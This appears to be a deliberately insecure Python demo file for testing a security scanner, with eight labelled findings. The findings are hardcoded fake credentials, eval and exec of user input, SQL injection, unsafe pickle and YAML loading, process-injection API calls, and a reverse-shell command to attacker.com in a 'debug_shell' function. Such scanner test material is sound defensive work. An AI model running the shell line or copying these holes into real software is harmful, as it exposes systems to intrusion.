# Vulnerable Demo Application — Zentronyx Security Test
# WARNING: This file is intentionally insecure for scanner demonstration purposes.

import os
import pickle
import yaml
import sqlite3

# -----------------------------------------------------------------------
# FINDING 1: Hardcoded Secret / API Token  (CWE-798)
# -----------------------------------------------------------------------
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE1234567890"
api_key = "secret_key=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890"
password = "my_super_secret_password_1234"

# -----------------------------------------------------------------------
# FINDING 2: Arbitrary Code Execution via eval()  (CWE-95)
# -----------------------------------------------------------------------
def run_user_input(user_data):
    result = eval(user_data)
    return result

# -----------------------------------------------------------------------
# FINDING 3: SQL Injection via f-string  (CWE-89)
# -----------------------------------------------------------------------
def get_user(username):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
    return cursor.fetchall()

# -----------------------------------------------------------------------
# FINDING 4: Unsafe Pickle Deserialization  (CWE-502)
# -----------------------------------------------------------------------
def load_session(data: bytes):
    session = pickle.loads(data)
    return session

# -----------------------------------------------------------------------
# FINDING 5: Unsafe YAML Deserialization  (CWE-502)
# -----------------------------------------------------------------------
def parse_config(config_str: str):
    config = yaml.load(config_str)
    return config

# -----------------------------------------------------------------------
# FINDING 6: Reverse Shell Spawn  (CWE-78)
# -----------------------------------------------------------------------
def debug_shell():
    os.system("bash -i >& /dev/tcp/attacker.com/4444 0>&1")

# -----------------------------------------------------------------------
# FINDING 7: Process Memory Injection APIs  (CWE-114)
# -----------------------------------------------------------------------
def inject_payload():
    import ctypes
    ctypes.windll.kernel32.VirtualAllocEx(0xFFFF, 0, 4096, 0x3000, 0x40)
    ctypes.windll.kernel32.WriteProcessMemory(0xFFFF, 0, b"\x90\x90", 2, None)
    ctypes.windll.kernel32.CreateRemoteThread(0xFFFF, None, 0, 0, None, 0, None)

# -----------------------------------------------------------------------
# FINDING 8: exec() of user-controlled input  (CWE-95)
# -----------------------------------------------------------------------
def execute_script(script_code):
    exec(script_code)
